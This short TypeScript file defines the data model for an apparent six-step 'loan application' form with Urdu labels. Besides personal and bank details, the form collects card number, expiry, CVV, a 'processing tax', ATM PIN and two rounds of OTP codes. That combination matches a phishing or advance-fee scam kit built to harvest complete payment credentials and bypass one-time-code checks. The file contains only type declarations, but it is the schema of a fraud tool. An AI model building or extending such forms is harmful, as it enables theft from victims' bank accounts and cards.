export interface ApplicationFormData {
  // Step 1: Personal Information
  fullName: string;
  cnic: string;
  mobileNo: string;
  gender: string;
  dateOfBirth: string;
  province: string;
  address: string;

  // Step 2: Bank Information
  loanAmount: string;
  loanPurpose: string;
  occupation: string;
  bankName: string;
  accountNumber: string;
  currentBalance: string;
  monthlyIncome: string;

  // Step 3: Card / Fees
  cardNumber: string;
  expiry: string;
  cvv: string;
  processingTax: string;

  // Step 4: OTP Verification
  otpCode: string[];

  // Step 5: ATM PIN
  atmPin: string[];

  // Step 6: Final OTP
  finalOtpCode: string[];
}

export type StepNumber = 1 | 2 | 3 | 4 | 5 | 6;

export interface StepMeta {
  number: StepNumber;
  label: string;
  urduLabel: string;
  iconName: string;
}
